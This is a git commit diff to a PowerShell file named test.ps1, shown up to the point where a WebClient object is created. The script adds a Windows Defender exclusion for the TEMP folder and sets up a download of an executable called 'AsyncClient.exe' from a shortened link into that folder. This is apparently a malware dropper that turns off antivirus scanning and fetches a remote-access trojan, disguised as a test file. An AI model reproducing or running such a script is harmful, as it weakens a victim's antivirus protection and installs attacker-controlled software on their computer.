51c84210b0b39943424d23ef75354ecbba4c89cf
AnshuOp0001 <123198875+AnshuOp0001@users.noreply.github.com>
2025-01-08 21:53:24 +0530

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,9 +1,14 @@
-Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+# Set the exclusion path to the system's temporary folder
+Add-MpPreference -ExclusionPath $env:TEMP
+
+# Define the URL of the file to download
 $url = 'https://tinyurl.com/3yhak4wk'
-$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'AsyncClient.exe')
+
+# Set the output path to the temporary folder
+$outputFile = [System.IO.Path]::Combine($env:TEMP, 'AsyncClient.exe')
 
 # Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
-Start-Sleep -Milliseconds 100 
+Start-Sleep -Milliseconds 100
 
 # Create a WebClient object to download the file
 $webClient = New-Object System.Net.WebClient
